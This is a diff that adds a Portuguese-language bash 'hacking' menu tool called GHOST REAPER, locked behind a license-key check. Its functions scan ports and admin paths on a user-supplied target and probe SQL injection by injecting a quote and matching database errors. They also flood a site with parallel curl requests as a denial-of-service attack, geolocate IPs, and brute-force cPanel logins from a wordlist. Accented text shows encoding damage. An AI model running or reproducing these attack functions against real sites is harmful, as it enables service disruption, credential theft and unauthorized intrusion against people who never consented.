@@ -1,0 +1,196 @@
+#!/bin/bash
+
+KEY_FILE="keys.txt"
+
+verificar_key() {
+    clear
+    echo "======================================="
+    echo "           GHOST REAPER - GHOST TEAM"
+    echo "======================================="
+    echo -n "DIGITE SUA KEY: "
+    read key
+
+    if [ ! -f "$KEY_FILE" ]; then
+        echo "Arquivo keys.txt nÃ£o encontrado!"
+        exit 1
+    fi
+
+    resultado=$(grep "$key" "$KEY_FILE")
+
+    if [ -z "$resultado" ]; then
+        echo "======================================="
+        echo "      KEY INVÃLIDA - GHOST TEAM"
+        echo "======================================="
+        exit 1
+    fi
+
+    validade=$(echo $resultado | cut -d '|' -f2 | xargs)
+
+    if [[ "$validade" == "PERMANENTE" ]]; then
+        echo "KEY VÃLIDA (PERMANENTE) - ACESSO LIBERADO"
+    else
+        hoje=$(date +%Y-%m-%d)
+        if [[ "$hoje" > "$validade" ]]; then
+            echo "======================================="
+            echo "    KEY EXPIRADA EM $validade - GHOST TEAM"
+            echo "======================================="
+            exit 1
+        else
+            echo "KEY VÃLIDA ATÃ‰ $validade - ACESSO LIBERADO"
+        fi
+    fi
+}
+
+verificar_key
+
+scan_ports() {
+    echo -n "Digite o domÃ­nio ou IP: "
+    read alvo
+    ports=(21 22 23 25 53 80 110 139 143 443 445 3306 3389 8080)
+    echo "Iniciando scan de portas em $alvo"
+    for port in "${ports[@]}"; do
+        timeout 1 bash -c "</dev/tcp/$alvo/$port" &>/dev/null && echo "Porta $port ABERTA" || echo "Porta $port FECHADA"
+    done
+}
+
+scan_admin_panel() {
+    echo -n "Digite o domÃ­nio (ex: site.com): "
+    read alvo
+    paths=(admin administrator painel paineladmin cpanel wp-admin adm dashboard manage user login)
+    for path in "${paths[@]}"; do
+        url="http://$alvo/$path"
+        resp=$(curl -o /dev/null -s -w "%{http_code}" "$url")
+        [[ "$resp" == "200" ]] && echo "Painel encontrado: $url" || echo "NÃ£o encontrado: $url"
+    done
+}
+
+scan_sql() {
+    echo -n "Digite o domÃ­nio (ex: site.com): "
+    read alvo
+    paths=(/index.php?id= /page.php?id= /product.php?id= /view.php?id= /item.php?id=)
+    for path in "${paths[@]}"; do
+        url="http://$alvo$path'"
+        echo "Testando: $url"
+        res=$(curl -s "$url")
+        if echo "$res" | grep -q -E "SQL syntax|mysql_fetch|SQLSTATE|syntax error|Fatal error"; then
+            echo "VulnerÃ¡vel -> $url"
+        else
+            echo "Seguro -> $url"
+        fi
+    done
+}
+
+invert_ip() {
+    echo -n "Digite o IP IPv4 (ex: 192.168.0.1): "
+    read ip
+    if [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+        echo "IPv6 equivalente: ::ffff:$ip"
+    else
+        echo "IP invÃ¡lido."
+    fi
+}
+
+dos_attack() {
+    echo -n "Digite o site (ex: http://site.com): "
+    read alvo
+    echo -n "Digite a quantidade de requisiÃ§Ãµes: "
+    read quantidade
+    echo "Iniciando DOS contra $alvo"
+    seq $quantidade | parallel -j 50 curl -s -o /dev/null $alvo
+    echo "DOS finalizado."
+}
+
+ver_ip() {
+    echo "Seu IP pÃºblico Ã©:"
+    curl ifconfig.me
+}
+
+loc_ip() {
+    echo -n "Digite o IP: "
+    read ip
+    dados=$(curl -s http://ip-api.com/json/$ip)
+
+    status=$(echo "$dados" | jq -r '.status')
+    if [[ "$status" != "success" ]]; then
+        echo "IP invÃ¡lido ou nÃ£o encontrado."
+        return
+    fi
+
+    pais=$(echo "$dados" | jq -r '.country')
+    regiao=$(echo "$dados" | jq -r '.regionName')
+    cidade=$(echo "$dados" | jq -r '.city')
+    isp=$(echo "$dados" | jq -r '.isp')
+    lat=$(echo "$dados" | jq -r '.lat')
+    lon=$(echo "$dados" | jq -r '.lon')
+
+    echo "======================================="
+    echo "PaÃ­s: $pais"
+    echo "RegiÃ£o: $regiao"
+    echo "Cidade: $cidade"
+    echo "Operadora: $isp"
+    echo "Latitude: $lat"
+    echo "Longitude: $lon"
+    echo "Mapa: https://www.google.com/maps?q=$lat,$lon"
+    echo "======================================="
+}
+
+quebrar_senha_adm() {
+    echo -n "Digite a URL do painel cPanel (ex: https://site.com/cpanel): "
+    read url
+    if [ ! -f ghost_list.txt ]; then
+        echo "Wordlist ghost_list.txt nÃ£o encontrada!"
+        return
+    fi
+    testar_login() {
+        IFS=":" read -r user pass <<< "$1"
+        resp=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$url" -d "user=$user&pass=$pass")
+        if [[ "$resp" == "302" || "$resp" == "303" ]]; then
+            echo "SUCESSO -> $user:$pass"
+        else
+            echo "FALHA -> $user:$pass"
+        fi
+    }
+    export -f testar_login
+    export url
+    cat ghost_list.txt | parallel -j 5 testar_login {}
+}
+
+while true; do
+    echo ""
+    echo "============= MENU ============="
+    echo "1) SCANEAR SITE (PORTAS)"
+    echo "2) SCANEAR ADM"
+    echo "3) PROCURAR FALHAS (SQL)"
+    echo "4) INVERTER IP (IPv4 para IPv6)"
+    echo "5) DOS (TESTE DE ESTRESSE)"
+    echo "6) VER IP"
+    echo "7) LOC IP"
+    echo "8) QUEBRAR SENHA ADM (CPANEL)"
+    echo "0) Sair"
+    echo "================================="
+    echo -n "Escolha uma opÃ§Ã£o: "
+    read opcao
+
+    case $opcao in
+        1) scan_ports;;
+        2) scan_admin_panel;;
+        3) scan_sql;;
+        4) invert_ip;;
+        5) dos_attack;;
+        6) ver_ip;;
+        7) loc_ip;;
+        8) quebrar_senha_adm;;
+        0) echo "Saindo..."; exit 0;;
+        *) echo "OpÃ§Ã£o invÃ¡lida. Tente novamente.";;
+    esac
+
+    while true; do
+        echo -n "QUER VOLTAR AO MENU? (S/N): "
+        read resp
+        case $resp in
+            [Ss]) break ;;
+            [Nn]) echo "Saindo..."; exit 0 ;;
+            *) echo "Resposta invÃ¡lida. Digite S ou N." ;;
+        esac
+    done
+done
